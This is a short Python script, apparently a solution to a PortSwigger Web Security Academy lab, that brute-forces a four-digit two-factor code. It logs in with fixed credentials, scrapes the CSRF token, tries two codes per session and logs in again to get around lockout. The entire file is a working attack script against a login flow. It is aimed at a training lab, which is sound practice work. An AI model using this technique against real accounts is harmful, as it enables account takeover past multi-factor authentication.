#!/usr/bin/python

import itertools

from requests.models import Response
from requests_html import HTMLSession

URL = "https://ac8d1fea1f100aed8043507800720056.web-security-academy.net/"
LOGIN_URL = URL + "login"
VER_URL = URL + "login2"

s = HTMLSession()


def get_csrf(res):
    return res.html.find("input[name='csrf']", first=True).attrs["value"]


def login():
    get = s.get(LOGIN_URL)
    csrf = get_csrf(get)
    data = {"csrf": csrf, "username": "carlos", "password": "montoya"}
    _ = s.post(LOGIN_URL, data)


def is_valid(res: Response):
    return res.text.find("Incorrect security code") == -1


def verification(codes: list[str]):
    get = s.get(VER_URL)
    csrf = get_csrf(get)
    data = {
        "csrf": csrf,
    }

    for code in codes:
        data["mfa-code"] = code
        res = s.post(VER_URL, data)
        print("try code: ", code)
        if is_valid(res):
            return code


def brute_force():
    perms = itertools.product("0123456789", repeat=4)
    for verif in perms:
        verification(["".join(verif), "".join(next(perms))])
        login()


login()
brute_force()
